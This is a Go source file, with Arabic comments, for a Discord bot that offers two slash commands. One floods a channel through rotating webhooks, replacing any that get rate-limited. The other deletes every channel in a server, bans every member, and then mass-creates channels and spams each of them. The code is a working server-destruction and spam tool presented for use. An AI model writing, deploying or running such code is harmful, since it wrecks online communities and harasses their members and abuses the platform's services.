package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"github.com/bwmarrin/discordgo"
)

var httpClient = &http.Client{
	Timeout: 10 * time.Second,
}

func main() {
	token := os.Getenv("MASTERGUARD_TOKEN")
	if token == "" {
		fmt.Println("❌ خطأ: متغير البيئة MASTERGUARD_TOKEN غير موجود")
		return
	}

	sess, err := discordgo.New("Bot " + token)
	if err != nil {
		fmt.Println("خطأ في إنشاء جلسة البوت:", err)
		return
	}

	sess.Identify.Intents = discordgo.IntentsAll

	cmdWhSpam := "wh_spam"
	commandWhSpam := &discordgo.ApplicationCommand{
		Name:        cmdWhSpam,
		Description: "سبام 5 ويب هوكات بأقصى سرعة مع الاستبدال الفوري",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionChannel,
				Name:        "channel",
				Description: "الروم المستهدف",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "webhook_name",
				Description: "اسم الويب هوك",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل الإجمالي المطلوب",
				Required:    true,
			},
		},
	}

	cmdDestroy := "destroy_server"
	commandDestroy := &discordgo.ApplicationCommand{
		Name:        cmdDestroy,
		Description: "أمر تدمير السيرفر",
		Options: []*discordgo.ApplicationCommandOption{
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "room_name",
				Description: "اسم الرومات الجديدة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "rooms_count",
				Description: "عدد الرومات",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionString,
				Name:        "message_content",
				Description: "محتوى الرسالة",
				Required:    true,
			},
			{
				Type:        discordgo.ApplicationCommandOptionInteger,
				Name:        "messages_count",
				Description: "عدد الرسائل في كل روم",
				Required:    true,
			},
		},
	}

	sess.AddHandler(func(s *discordgo.Session, i *discordgo.InteractionCreate) {
		if i.Type != discordgo.InteractionApplicationCommand {
			return
		}

		if i.Member == nil || (i.Member.Permissions & discordgo.PermissionAdministrator) == 0 {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "❌ هذا الأمر للمشرفين فقط.",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})
			return
		}

		cmdName := i.ApplicationCommandData().Name

		if cmdName == cmdWhSpam {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تشغيل الـ 5 ويب هوكات بأقصى سرعة...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range i.ApplicationCommandData().Options {
				optionMap[opt.Name] = opt
			}

			channelID := optionMap["channel"].ChannelValue(s).ID
			messageContent := optionMap["message_content"].StringValue()
			webhookName := optionMap["webhook_name"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())

			go runWebhookSpamPerfect(token, channelID, webhookName, messageContent, messagesCount, s)

		} else if cmdName == cmdDestroy {
			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "🚀 جاري تنفيذ أمر التدمير...",
					Flags:   discordgo.MessageFlagsEphemeral,
				},
			})

			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
			for _, opt := range i.ApplicationCommandData().Options {
				optionMap[opt.Name] = opt
			}

			roomName := optionMap["room_name"].StringValue()
			roomsCount := int(optionMap["rooms_count"].IntValue())
			messageContent := optionMap["message_content"].StringValue()
			messagesCount := int(optionMap["messages_count"].IntValue())
			guildID := i.GuildID

			go executeDestruction(s, token, guildID, roomName, roomsCount, messageContent, messagesCount)
		}
	})

	err = sess.Open()
	if err != nil {
		fmt.Println("خطأ في تشغيل الجلسة:", err)
		return
	}

	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandWhSpam)
	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandDestroy)
	fmt.Println("🤖 البوت شغال الآن بنجاح!")

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-stop

	sess.Close()
}

type WebhookInfo struct {
	URL string
	ID  string
}

func createSingleWebhook(token, channelID, webhookName string) (string, string) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
		"User-Agent":    "DiscordBot (https://discord.com, v10)",
	}

	payload, _ := json.Marshal(map[string]string{"name": webhookName})
	req, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/webhooks", bytes.NewBuffer(payload))
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return "", ""
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
		var wh map[string]interface{}
		if err := json.NewDecoder(resp.Body).Decode(&wh); err == nil {
			if id, ok := wh["id"].(string); ok {
				if tkn, ok := wh["token"].(string); ok {
					url := fmt.Sprintf("https://discord.com/api/v10/webhooks/%s/%s", id, tkn)
					return url, id
				}
			}
		}
	}
	return "", ""
}

func deleteSingleWebhook(token, webhookID string) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"User-Agent":    "DiscordBot (https://discord.com, v10)",
	}

	req, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/webhooks/"+webhookID, nil)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := httpClient.Do(req)
	if err == nil {
		resp.Body.Close()
	}
}

// الكود النهائي المفحوص والمصحح: 5 ويب هوكات تعمل مع بعض فوراً مع الاستبدال الذكي والآمن
func runWebhookSpamPerfect(token, channelID, webhookName, messageContent string, totalGoal int, s *discordgo.Session) {
	const activeCount = 5
	webhooks := make([]WebhookInfo, 0, activeCount)
	var mu sync.Mutex
	var wgSetup sync.WaitGroup

	// 1. إنشاء الـ 5 ويب هوكات بشكل متزامن ومضمون
	for i := 0; i < activeCount; i++ {
		wgSetup.Add(1)
		go func() {
			defer wgSetup.Done()
			url, id := createSingleWebhook(token, channelID, webhookName)
			if url != "" && id != "" {
				mu.Lock()
				webhooks = append(webhooks, WebhookInfo{URL: url, ID: id})
				mu.Unlock()
			}
		}()
	}
	wgSetup.Wait()

	if len(webhooks) == 0 {
		s.ChannelMessageSend(channelID, "❌ فشل في إنشاء الويب هوكات.")
		return
	}

	// 2. إرسال الرسائل بأقصى سرعة مع التوزيع الآمن على الـ 5 ويب هوكات
	var wgSpam sync.WaitGroup
	for i := 0; i < totalGoal; i++ {
		wgSpam.Add(1)
		go func(index int) {
			defer wgSpam.Done()

			// جلب الويب هوك الخاص بهذه الرسالة بشكل آمن بدون حجز المعالج
			mu.Lock()
			if len(webhooks) == 0 {
				mu.Unlock()
				return
			}
			wh := webhooks[index%len(webhooks)]
			mu.Unlock()

			startTime := time.Now()
			msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
			req, _ := http.NewRequest("POST", wh.URL, bytes.NewBuffer(msgPayload))
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")

			resp, err := httpClient.Do(req)
			duration := time.Since(startTime)

			isSlowOrLimited := false
			if err != nil {
				isSlowOrLimited = true
			} else {
				defer resp.Body.Close()
				if resp.StatusCode == 429 || resp.StatusCode >= 500 {
					isSlowOrLimited = true
				}
			}

			// إذا أصبح الويب هوك بطيئاً أو واجه لمتد، احذفه وأنشئ بديله فوراً في الخلفية
			if isSlowOrLimited || duration > 350*time.Millisecond {
				go deleteSingleWebhook(token, wh.ID)

				newURL, newID := createSingleWebhook(token, channelID, webhookName)
				if newURL != "" && newID != "" {
					mu.Lock()
					for idx, item := range webhooks {
						if item.ID == wh.ID {
							webhooks[idx] = WebhookInfo{URL: newURL, ID: newID}
							break
						}
					}
					mu.Unlock()
				}
			}
		}(i)
	}
	wgSpam.Wait()

	// 3. تنظيف الويب هوكات نهائياً بعد انتهاء الإرسال
	mu.Lock()
	for _, wh := range webhooks {
		go deleteSingleWebhook(token, wh.ID)
	}
	mu.Unlock()

	s.ChannelMessageSend(channelID, "⚡ تم الانتهاء من إرسال كافة الرسائل بأقصى سرعة واستبدال البطيء بنجاح!")
}

func executeDestruction(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
	headers := map[string]string{
		"Authorization": "Bot " + token,
		"Content-Type":  "application/json",
		"User-Agent":    "DiscordBot (https://discord.com, v10)",
	}

	req, err := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
	if err == nil {
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := httpClient.Do(req)
		if err == nil {
			var channels []map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&channels)
			resp.Body.Close()

			var wgDel sync.WaitGroup
			for _, ch := range channels {
				if id, ok := ch["id"].(string); ok {
					wgDel.Add(1)
					go func(chID string) {
						defer wgDel.Done()
						delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil)
						for k, v := range headers {
							delReq.Header.Set(k, v)
						}
						if r, e := httpClient.Do(delReq); e == nil {
							r.Body.Close()
						}
					}(id)
				}
			}
			wgDel.Wait()
		}
	}

	go func() {
		after := ""
		for {
			members, err := s.GuildMembers(guildID, after, 1000)
			if err != nil || len(members) == 0 {
				break
			}

			var wgBan sync.WaitGroup
			for _, member := range members {
				if member == nil || member.User == nil {
					continue
				}
				wgBan.Add(1)
				go func(userID string) {
					defer wgBan.Done()
					s.GuildBanCreate(guildID, userID, 0)
				}(member.User.ID)
				after = member.User.ID
			}
			wgBan.Wait()

			if len(members) < 1000 {
				break
			}
		}
	}()

	var channelIDs []string
	var mu sync.Mutex
	var wgCreate sync.WaitGroup

	for i := 0; i < roomsCount; i++ {
		wgCreate.Add(1)
		go func(index int) {
			defer wgCreate.Done()
			payload, _ := json.Marshal(map[string]interface{}{
				"name": fmt.Sprintf("%s-%d", roomName, index),
				"type": 0,
			})
			reqCreate, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(payload))
			for k, v := range headers {
				reqCreate.Header.Set(k, v)
			}

			resp, err := httpClient.Do(reqCreate)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusCreated {
				var chResult map[string]interface{}
				if json.NewDecoder(resp.Body).Decode(&chResult) == nil {
					if chID, ok := chResult["id"].(string); ok {
						mu.Lock()
						channelIDs = append(channelIDs, chID)
						mu.Unlock()
					}
				}
			}
		}(i)
	}
	wgCreate.Wait()

	var wgMsg sync.WaitGroup
	for _, chID := range channelIDs {
		wgMsg.Add(1)
		go func(cID string) {
			defer wgMsg.Done()
			for m := 0; m < messagesCount; m++ {
				msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
				msgReq, _ := http.NewRequest("POST", "https://discord.com/api/v10/channels/"+cID+"/messages", bytes.NewBuffer(msgPayload))
				for k, v := range headers {
					msgReq.Header.Set(k, v)
				}

				msgResp, err := httpClient.Do(msgReq)
				if err != nil {
					time.Sleep(20 * time.Millisecond)
					continue
				}

				if msgResp.StatusCode == 429 {
					msgResp.Body.Close()
					time.Sleep(200 * time.Millisecond)
					m--
					continue
				}
				msgResp.Body.Close()
				time.Sleep(15 * time.Millisecond)
			}
		}(cID)
	}
	wgMsg.Wait()
}
